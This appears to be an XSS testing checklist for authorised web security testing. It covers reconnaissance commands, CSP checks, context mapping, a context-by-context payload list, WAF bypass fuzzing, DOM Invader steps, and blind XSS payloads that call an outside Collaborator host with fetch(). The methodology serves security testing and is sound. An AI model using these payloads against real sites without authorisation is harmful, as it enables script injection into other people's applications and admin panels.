# XSS Testing Checklist

> **Phase:** Post-recon. Traffic is captured. You are testing for reflected, blind, and DOM-based XSS only. No stored XSS.

---

## Step 1 — Identify Reflected XSS Surfaces

Walk the application and flag every place where user-supplied input is reflected back in the response. These are your test targets.

### URL Parameters
- [ ] Query string parameters (`?q=`, `?search=`, `?id=`, `?redirect=`, etc.)
```bash
cat all-params-final.txt | Gxss | tee reflected-params.txt
```

- [ ] Path segments (`/user/USERNAME/profile`)
```bash
nuclei -list urls-no-params.txt -t ~/path-segment-reflect.yaml
```

- [ ] Fragment / hash (`#section`, `#returnUrl=`)
```bash
cat urls-no-params-live.txt live-params.txt | cut -d "#" -f1 | while read i; do echo "$i#j4xx3n"; done > fragment-test.txt

httpx-toolkit -l fragment-test.txt -ms "j4xx3n" | tee reflected-fragments.txt
```


### Form Fields
- [ ] Search boxes
- [ ] Login forms (username field on failed login — often reflected in error message)
- [ ] Registration forms (username, email reflected on error)
- [ ] Password reset forms (email / username reflected)
- [ ] Filter / sort dropdowns that reflect the selected value
- [ ] Any field where the submitted value appears on the next page

### HTTP Headers Reflected in Response
- [ ] `User-Agent` — check if reflected in error pages or analytics display
- [ ] `Referer` — check if reflected in "you came from" messages
- [ ] `X-Forwarded-For` — check if reflected in IP display or debug output
- [ ] `Accept-Language` — check if reflected in language/locale display

### Other Surfaces
- [ ] 404 / error pages that echo the requested URL or path
- [ ] Open redirect parameters (`?next=`, `?url=`, `?return=`, `?goto=`)
- [ ] Autocomplete / type-ahead API responses that echo input

> For each surface, note the parameter name, HTTP method, and where in the response the value appears.

---

## Step 2 — Identify Blind XSS Surfaces

Blind XSS fires in a context you cannot directly observe — admin panels, log viewers, email systems, support dashboards. Inject into all of the following.

### User-Facing Forms That Reach Backend Staff
- [ ] Contact / feedback forms
- [ ] Support ticket / help desk submission forms
- [ ] Bug report forms
- [ ] Review / rating submission forms
- [ ] Job application forms
- [ ] "Request a demo" or "Contact sales" forms

### Profile Fields Likely Displayed in Admin Dashboards
- [ ] Full name / display name
- [ ] Username
- [ ] Bio / description
- [ ] Company name
- [ ] Address fields
- [ ] Any free-text field tied to an account record

### HTTP Headers Logged Server-Side
- [ ] `User-Agent` — very commonly stored in logs and displayed in admin panels
- [ ] `Referer`
- [ ] `X-Forwarded-For`
- [ ] Custom headers the app accepts (`X-Real-IP`, `CF-Connecting-IP`)

### Other Backend-Processed Inputs
- [ ] File upload — filename field (inject payload as the filename)
- [ ] Any field labeled "notes", "comments", "reason", "description" in a privileged workflow (order cancellation reason, dispute reason, etc.)

---

## Step 3 — Check CSP Before Testing Each Surface

Run this check per surface **before** spending time on payloads. If inline scripts are blocked with no bypass vector, the surface is not exploitable via reflected or blind XSS.

- [ ] Load the target page and check the response headers in Burp for `Content-Security-Policy`
- [ ] If CSP is **absent** → proceed to Step 4
- [ ] If CSP is present, check the `script-src` or `default-src` directive:

| CSP Value | Implication |
|---|---|
| No CSP | Fully exploitable — proceed |
| `unsafe-inline` present | Inline scripts allowed — proceed |
| `nonce-` based, no `unsafe-inline` | Reflected XSS blocked unless nonce leaks — skip surface |
| `strict-dynamic` | Blocks inline injection — skip surface |
| Only whitelisted domains | Blocked unless a whitelisted domain hosts a script gadget |

- [ ] If CSP blocks inline scripts → mark surface as **not testable for reflected/blind XSS**, move on
- [ ] If CSP is present but allows `unsafe-inline` → proceed as normal

---

## Step 4 — Context Mapping

Before selecting a payload, determine exactly where in the response your input lands. Inject the following test string into each surface and view source:

**Test string:** `canary"'<>/`

Then locate the test string in the response source and match it to a context below.

### HTML Body Context
Input lands as raw text content between tags:
```html
<p>Results for: canary"'<>/</p>
```
- [ ] Angle brackets render unencoded → HTML body, no encoding

### HTML Attribute Context
Input lands inside a tag attribute:
```html
<input value="canary"'<>/">
<a href='/search?q=canary"'>
```
- [ ] Note whether the attribute uses double quotes, single quotes, or is unquoted
- [ ] Note which characters are HTML-encoded (`"` → `&quot;`, `'` → `&#x27;`, `<>` → `&lt;&gt;`)

### JavaScript String Context
Input lands inside a JavaScript string:
```js
var query = 'canary"\'<>/';
var query = "canary\"'<>/";
```
- [ ] Note which quote type wraps the string
- [ ] Note whether backslash, single quotes, or angle brackets are escaped

### JavaScript Template Literal Context
Input lands inside a backtick string:
```js
var msg = `You searched for: canary"'<>/`;
```
- [ ] Template literals use `${}` for interpolation — quote escaping is irrelevant here

### URL Sink Context
Input lands as a URL value in `href`, `src`, `action`, or `location`:
```html
<a href="https://site.com/canary"'<>/">
```
- [ ] Check if `javascript:` is accepted as a protocol

### JSON Context
Input lands inside a JSON response that is then parsed and written to the DOM:
```json
{"query":"canary\"'<>/","results":[]}
```
- [ ] Check if backslash escaping is applied to the JSON value

### HTML Comment Context
Input lands inside an HTML comment:
```html
<!-- Search: canary"'<>/ -->
```

### AngularJS Template Context
Input lands in a page that uses AngularJS (`ng-app`):
```html
<body ng-app> ... canary"'<>/ ... </body>
```
- [ ] Check for `ng-app` or `ng-controller` attributes in the page source

---

## Step 5 — Payload Selection by Context

Use the context identified in Step 4 to select the appropriate payload. Confirm execution with `alert(1)`.

### HTML Body — No Encoding
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### HTML Attribute — Double Quoted, Angle Brackets Encoded
```
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

### HTML Attribute — Single Quoted, Angle Brackets Encoded
```
' onmouseover='alert(1)
```

### HTML Attribute — Angle Brackets Not Encoded (break out of tag)
```
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

### HTML Attribute — `href` / `src` / URL Sink
```
javascript:alert(1)
```

### JavaScript String — Single Quoted
```
'-alert(1)-'
';alert(1)//
```

### JavaScript String — Single Quoted, Backslash Escaped
```
\';alert(1)//
```

### JavaScript String — Angle Brackets and Quotes Encoded (break out at script tag level)
```
</script><script>alert(1)</script>
```

### JavaScript Template Literal
```
${alert(1)}
```

### JSON Context
```
\"-alert(1)}//
```

### HTML Comment Context
```
--><script>alert(1)</script>
```

### AngularJS Expression Context
```
{{constructor.constructor('alert(1)')()}}
```

### Canonical Link Tag (`<link rel="canonical">`)
```
'accesskey='x'onclick='alert(1)
```
> Trigger with `Alt+Shift+X` (Windows/Linux) or `Ctrl+Alt+X` (macOS)

---

## Step 6 — WAF / Filter Bypass

If a payload from Step 5 is blocked or sanitised:

- [ ] Go to **[xssnow.com](https://xssnow.com)** and find bypass techniques specific to the context and what is being filtered
- [ ] If the WAF blocks specific tags or events, use Burp Intruder to fuzz for allowed ones:
  - Send the request to Intruder
  - Set the tag name as the fuzz position: `<§tag§>`
  - Load the PortSwigger XSS cheatsheet tag list as the payload
  - Run the attack — look for responses with a different status or length
  - Once an allowed tag is found, repeat for event handlers: `<allowedtag §event§=alert(1)>`

---

## Step 7 — DOM XSS with DOM Invader

Run this section for every page that has URL parameters, a hash fragment, or uses postMessage.

### Setup
- [ ] Open Burp's embedded Chromium browser
- [ ] Click the **DOM Invader** extension icon and enable it
- [ ] Note the **canary string** shown in the DOM Invader panel (or set a custom one)
- [ ] Enable **postMessage testing** in the DOM Invader settings

### Testing Each Page
- [ ] Navigate to the target page in the embedded browser
- [ ] Manually interact with the page to trigger all code paths:
  - Submit every form on the page
  - Click all buttons and links
  - Change URL parameters to the canary string: `?param=CANARY`
  - Change the hash to the canary string: `#CANARY`
  - Trigger any AJAX calls (filter changes, search, pagination)
- [ ] Check the DOM Invader panel after each interaction for canary hits

### When a Hit is Detected
- [ ] In the DOM Invader panel, identify the **source** (where the canary entered — URL param, hash, postMessage, etc.)
- [ ] Identify the **sink** (where it landed — `innerHTML`, `document.write`, `location.href`, `eval`, etc.)
- [ ] Click **Exploit** in DOM Invader to attempt automatic payload generation
- [ ] Confirm execution with `alert(1)`

### postMessage-Specific Testing
- [ ] In DOM Invader, switch to the **postMessage** tab
- [ ] DOM Invader will list any `message` event listeners detected on the page
- [ ] For each listener, click **Send** to fire a test postMessage with the canary
- [ ] Check if the canary reaches a sink — if yes, click **Exploit**

### Common DOM Sinks to Note
| Sink | Risk |
|---|---|
| `innerHTML` | XSS — `<img src=x onerror=alert(1)>` |
| `document.write` | XSS — `<script>alert(1)</script>` |
| `location.href` | XSS or open redirect — `javascript:alert(1)` |
| `eval` | XSS — `alert(1)` |
| `setTimeout` / `setInterval` | XSS — `alert(1)` |
| `jQuery $()` | XSS — `<img src=x onerror=alert(1)>` |
| `document.cookie` setter | Cookie manipulation |

---

## Step 8 — Blind XSS with Burp Collaborator

For every surface identified in Step 2, inject the following payload. You will not see execution directly — monitor Collaborator for an incoming HTTP request confirming the payload fired.

### Setup
- [ ] In Burp Suite Pro, open the **Collaborator** tab
- [ ] Click **Copy to clipboard** to get your unique subdomain (e.g. `abc123.oastify.com`)

### Payload
Inject this into every blind XSS surface. Replace `YOUR-COLLABORATOR` with your subdomain.

```html
<script>fetch('https://YOUR-COLLABORATOR.oastify.com?h='+document.location)</script>
```

For surfaces that may strip `<script>` tags:
```html
<img src=x onerror="fetch('https://YOUR-COLLABORATOR.oastify.com?h='+document.location)">
<svg onload="fetch('https://YOUR-COLLABORATOR.oastify.com?h='+document.location)">
```

For HTTP header injection (User-Agent, Referer) — set the header value to:
```
"><script>fetch('https://YOUR-COLLABORATOR.oastify.com?h='+document.location)</script>
```

### Monitoring
- [ ] After injecting into all surfaces, click **Poll now** in the Collaborator tab
- [ ] Wait a few minutes and poll again — some admin panels only load periodically
- [ ] When a callback arrives, the `h=` parameter shows which page triggered it, revealing the blind XSS location
- [ ] Note the full URL from the callback to understand the admin context where the payload executed

---

## Notes

<!-- Add target-specific findings, surface URLs, contexts, payload results, and Collaborator callback details here -->
